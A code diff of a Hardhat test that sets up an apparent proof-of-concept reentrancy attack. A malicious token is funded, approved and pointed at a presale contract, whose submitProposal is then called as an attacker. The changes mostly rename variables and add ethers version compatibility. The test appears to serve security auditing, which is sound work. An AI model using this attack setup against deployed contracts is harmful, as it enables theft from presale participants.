@@ -32,24 +32,25 @@ describe("PoC real: BashoodPresaleFinal.submitProposal against MaliciousBHT", fu
       9999999999, // presaleEnd
       100 // maxNFTSupply
     );
-    await presale.deployed();
-    const presaleAddr = presale.address;
+  await presale.deployed();
+  const presaleAddress = presale.getAddress ? await presale.getAddress() : presale.address;
 
-    // configure presale
-    await presale.setPriceFeed(price.getAddress ? await price.getAddress() : price.address);
+  // configure presale
+  await presale.setPriceFeed(price.getAddress ? await price.getAddress() : price.address);
     await presale.setMaxPriceStaleness(100000);
     await presale.setOperationsWallet(owner.address);
 
     // Fund presale with NFTs
-    await nft.mint(presaleAddr, 1, 10);
+  await nft.mint(presaleAddress, 1, 10);
 
     // Give attacker tokens and approve presale
-    await mal.mint(attacker.address, parseUnits ? parseUnits('100', 18) : ethers.utils.parseUnits('100', 18));
+  await mal.mint(attacker.address, parseUnits ? parseUnits('100', 18) : ethers.utils.parseUnits('100', 18));
     const malAsAttacker = mal.connect(attacker);
-    await malAsAttacker.approve(presaleAddr, parseUnits ? parseUnits('50', 18) : ethers.utils.parseUnits('50', 18));
+
+  await malAsAttacker.approve(presaleAddress, parseUnits ? parseUnits('50', 18) : ethers.utils.parseUnits('50', 18));
 
     // point malicious token at the real presale
-    await mal.setTarget(presaleAddr);
+  await mal.setTarget(presaleAddress);
 
     // Call submitProposal as attacker; if reentrancy occurs the malicious counter will reflect nested calls
     const presaleAsAttacker = presale.connect(attacker);
